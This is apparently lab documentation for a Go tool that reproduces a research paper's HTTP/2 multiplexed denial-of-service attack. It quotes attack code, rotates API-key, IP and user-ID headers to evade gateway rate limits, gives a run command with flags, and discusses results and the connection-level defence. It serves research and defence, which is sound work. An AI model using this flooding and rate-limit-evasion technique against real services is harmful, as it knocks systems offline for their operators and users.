# Algorithm 5 — HTTP/2 Multiplexed Attack, Explained

Companion documentation for `algorithm5_http2_mux.go`.
Implements Algorithm 5 of Sivakumar & Thilagam (IJACSA 16/3, 2025) §V.D.2.

This file answers the question: **"what does the Go HTTP/2 multiplexer
actually do?"** at three levels — the protocol, the code, and the
observable effect on the target.

---

## 1. What HTTP/2 multiplexing means at the protocol level

HTTP/1.1 has a strict *one-request-per-TCP-connection-at-a-time* model:

```
HTTP/1.1   (1 TCP connection)
  ┌──────────────────────────────────────────────────────────┐
  │ req#1 → resp#1 → req#2 → resp#2 → req#3 → resp#3 → ...   │
  └──────────────────────────────────────────────────────────┘
  ── Want 200 parallel requests? You need 200 sockets. ──
```

HTTP/2 introduces **streams** — independent, numbered, bidirectional
sub-channels multiplexed onto a single TLS/TCP socket:

```
HTTP/2     (1 TCP connection, hundreds of streams)
  ┌──────────────────────────────────────────────────────────┐
  │ stream 1  ▒▒▒▒▒  resp▒▒                                  │
  │ stream 3  ▒▒▒▒▒▒▒▒  resp▒▒▒                              │
  │ stream 5  ▒▒  resp▒▒▒▒▒▒▒                                │
  │ stream 7  ▒▒▒▒  resp▒                                    │
  │  ...     (all interleaved as HEADERS / DATA frames)      │
  └──────────────────────────────────────────────────────────┘
  ── 200 parallel requests share 1 socket, 1 TLS session. ──
```

A single client now looks to the network like **"1 connection, 1 IP, 1 TLS
handshake"** — but to the application server it's **"200 simultaneous
requests that all need worker threads / DB lookups / business logic
right now."**

This is the *feature* (faster page loads, cheaper sockets) being
weaponised as an *attack vector*.

---

## 2. What `algorithm5_http2_mux.go` does concretely

Each "client" in `-clients N` is one Go worker that:

### 2.1. Opens exactly **one** HTTP/2 connection per worker

```113:129:/home/user/Desktop/ddos/lab/attacks/algorithm5_http2_mux.go
func newH2Client(insecure bool, maxStreams int) *http.Client {
	tlsConf := &tls.Config{
		InsecureSkipVerify: insecure,
		NextProtos:         []string{"h2"},
	}

	transport := &http2.Transport{
		TLSClientConfig: tlsConf,
		// Force ONE TCP connection per host so streams multiplex over it.
		AllowHTTP:       false,
		StrictMaxConcurrentStreams: false,
	}
	return &http.Client{
		Transport: transport,
		Timeout:   30 * time.Second,
	}
}
```

`golang.org/x/net/http2.Transport` is special: by default it keeps **one**
TCP connection per host alive and pipes every request from that client
through it as a new stream.  `NextProtos: []string{"h2"}` forces ALPN to
negotiate the HTTP/2 protocol during the TLS handshake.

### 2.2. Picks a target endpoint

```131:149:/home/user/Desktop/ddos/lab/attacks/algorithm5_http2_mux.go
func pickTarget(rng *rand.Rand, doc targetsDoc, symmetric bool,
	staticTarget targetEntry) targetEntry {
	if staticTarget.Path != "" {
		return staticTarget
	}
	if symmetric {
		if len(doc.HeavyByLatency) > 0 {
			return doc.HeavyByLatency[0]
		}
	}
	pool := doc.TargetList
	if len(pool) == 0 {
		pool = doc.HeavyByLatency
	}
	if len(pool) == 0 {
		return targetEntry{Method: "GET", Path: "/"}
	}
	return pool[rng.Intn(len(pool))]
}
```

* `-symmetric=true` (default) → **always** hit the heaviest endpoint
  identified by Algorithm 2.  This is the fusion of Algorithm 3 + Algorithm 5
  from the paper.
* `-symmetric=false` → pick a random endpoint from the full target list each
  call.  This is the fusion of Algorithm 4 + Algorithm 5.

### 2.3. Builds a request with rotated identity headers

```207:215:/home/user/Desktop/ddos/lab/attacks/algorithm5_http2_mux.go
			req.Header.Set("X-API-KEY", randAPIKey(rng))
			req.Header.Set("X-Forwarded-For", randXFF(rng))
			req.Header.Set("X-User-Id", "u-"+randString(rng, 6))
			req.Header.Set("User-Agent",
				"Algo5-H2/"+strconv.Itoa(workerID))
			req.Header.Set("Accept", "application/json")
			if method != "GET" {
				req.Header.Set("Content-Type", "application/json")
			}
```

The three identifiers the gateway rate-limits on — `X-API-KEY`,
`X-Forwarded-For` (client IP), and `X-User-Id` — are freshly randomised for
every single stream.  The gateway therefore sees each stream as belonging
to a **different "user"** and never trips its 100-/70-/50-req/min buckets.

The API-key generator deliberately rotates **between all three bucket
prefixes** the gateway recognises:

```85:87:/home/user/Desktop/ddos/lab/attacks/algorithm5_http2_mux.go
func randAPIKey(rng *rand.Rand) string {
	return apiKeyPrefixes[rng.Intn(len(apiKeyPrefixes))] + randString(rng, 8)
}
```

where `apiKeyPrefixes = ["AX001-", "BX001-", "CC001-", "ZZ000-"]` —
matching the gateway's policy in `setup/gateway/ratelimit.lua`.

### 2.4. Fires up to `-streams S` requests in parallel, gated by a semaphore

```167:183:/home/user/Desktop/ddos/lab/attacks/algorithm5_http2_mux.go
	// Stream-level concurrency: a buffered semaphore caps in-flight
	// streams per client at `streams`, matching the paper's "Send Multiple
	// Requests as chunks and send as different streams" (Algorithm 5, l. 5).
	sema := make(chan struct{}, streams)
	var innerWg sync.WaitGroup

	for i := 0; i < requests; i++ {
		select {
		case <-ctx.Done():
			break
		default:
		}
		sema <- struct{}{}
		innerWg.Add(1)
		go func(iter int) {
			defer innerWg.Done()
			defer func() { <-sema }()
```

The buffered channel `sema` has capacity `streams`.  Acquiring it
(`sema <- struct{}{}`) blocks once `streams` goroutines are already
in-flight, and a goroutine releases its slot via `<-sema` in its `defer`.
Net effect: we keep **exactly `S` HTTP/2 streams pending on the wire at any
moment**, per worker.

### 2.5. The arithmetic of one full run

A run with `-clients 5 -requests 500 -streams 200` produces:

```
   5 TCP connections                ←  the only thing the network sees
×  200 concurrent streams each      ←  what the application server feels
= 1000 simultaneous in-flight HTTP/2 streams
   doing 2500 total requests
```

Compare this with the equivalent HTTP/1.1 attack (Algorithm 3): to get
1,000 simultaneous in-flight requests over HTTP/1.1, you'd need ~1,000
TCP sockets and ~1,000 TLS handshakes — both of which are *cheap* to
detect (SYN-flood / new-connection-rate limiters trigger immediately).

---

## 3. Why this hurts the server more than Algorithm 3 does

The Spring Boot / embedded Tomcat backend allocates **one worker thread
per active request**, regardless of whether that request arrived over
HTTP/1.1 or as an HTTP/2 stream.  When you push 1,000 streams down 5
sockets, Tomcat is forced to:

* spawn or wake ~1,000 worker threads,
* run the full pipeline for each: TLS decrypt → routing → business logic
  → DB query → response,
* allocate per-thread stacks (~512 KB each ≈ ~500 MB just for stacks),
* fight the JIT, which can't keep up with the warmup of all those
  threads, and
* burn CPU on kernel context-switches between them.

That's why this lab's integration test produced these numbers at only
`5 clients × 500 reqs`:

| Algorithm                  | Avg latency | Peak `orders` CPU |
|----------------------------|-------------|-------------------|
| Algo 3 (HTTP/1.1 symmetric)|   **8 ms**  | ~80 %             |
| Algo 5 (HTTP/2 multiplexed)| **403 ms**  | **545 %** (= 5.5 cores) |

The HTTP/2 run actually completed *fewer* RPS (1054 vs ~1500) but spent
**~50× more time per request** and burnt **~6× more CPU**, because the
load was concentrated in time — the server had to handle ~200 requests
*simultaneously* per client instead of sequentially.

At the paper's full scale (`-clients 15 -requests 2000 -streams 200`)
this is exactly what produces Table VII's 95 % CPU result.

---

## 4. Why the gateway can't stop it

The gateway's rate-limiter in `setup/gateway/ratelimit.lua` runs at the
**HTTP-request layer**, *after* Nginx has decoded each individual request
from its HTTP/2 frame stream.  Consequence:

* ✅ It can see each request's `X-API-KEY`, IP, and `X-User-Id` headers.
* ❌ It can't see "this is the 47th simultaneous stream on the same TCP
  socket."
* ❌ Each stream looks like a different user, because we rotated all
  three keys.

A **connection-level rate-limiter** (e.g. "no more than N concurrent
streams per TCP socket") *would* block this — and that's the defence the
paper recommends in §VIII.  The HTTP/2 spec even defines
`SETTINGS_MAX_CONCURRENT_STREAMS` for exactly this purpose, but in
practice gateways are configured with that set to ≥ 100 because lowering
it breaks legitimate browser parallelism.

---

## 5. TL;DR

> **"One TCP connection ≠ one request"** in HTTP/2.  By riding the
> multiplexing feature, an attacker turns N modest TCP connections into
> N×streams concurrent application-layer requests — which is what
> eventually saturates the Tomcat worker pool and pegs the CPU at 95 %
> in the paper's Table VII.

This is the *strongest* attack in the paper because it bypasses **both**:

* **Header-based rate-limits** (defeated by per-request key rotation —
  same trick as Algorithms 3 & 4)
* **Connection-rate-limits** (defeated because we use *fewer*
  connections, not more)

---

## 6. Running it

```bash
cd lab/attacks
go run algorithm5_http2_mux.go \
    -target       https://localhost:8443 \
    -targets-file ../results/targets.json \
    -clients   5  \
    -requests  500 \
    -streams   200 \
    -insecure              # lab uses a self-signed cert
```

Flags:

| Flag             | Default                 | Meaning |
|------------------|-------------------------|---------|
| `-target`        | (required)              | Base URL of the HTTP/2 target (or a full single-URL when `-targets-file` is empty). |
| `-targets-file`  | _empty_                 | JSON produced by `algorithms/algorithm2_identify.py`. |
| `-method`        | `GET`                   | HTTP verb when `-targets-file` is empty. |
| `-clients`       | `15`                    | Number of attacker workers = number of TCP connections. |
| `-requests`      | `2000`                  | Total requests issued **per worker**. |
| `-streams`       | `200`                   | Max in-flight HTTP/2 streams per worker. |
| `-symmetric`     | `true`                  | `true` → always hit the heaviest endpoint; `false` → rotate among the full target list per call. |
| `-insecure`      | `false`                 | Skip TLS verification (set this for the lab's self-signed cert). |
| `-out`           | `<lab>/results/h2mux_<unix-ts>.csv` | Output CSV path. |
| `$LAB_RESULTS`   | _env var_               | Override the default output directory. |

## 7. Output

Each invocation produces one timestamped CSV in `lab/results/`:

```
worker,iteration,epoch,method,path,status,latency_ms,error
0,0,1778635565,GET,/orders,200,11.20,
0,1,1778635565,GET,/orders,200,18.42,
1,0,1778635565,GET,/orders,200,10.34,
...
```

* `worker`     – which Go goroutine fired the request (0..N-1)
* `iteration`  – per-worker request counter (0..requests-1)
* `epoch`      – Unix timestamp at completion
* `method/path` – the endpoint hit (varies in asymmetric mode)
* `status`     – HTTP response code; `-1` = transport-level failure
* `latency_ms` – wall-clock RTT for that stream
* `error`      – Go error string if `status == -1`

Combine this CSV with `monitoring/monitor.sh`'s target-side CPU CSV to
reproduce Fig. 3e/3f and Table VII of the paper.
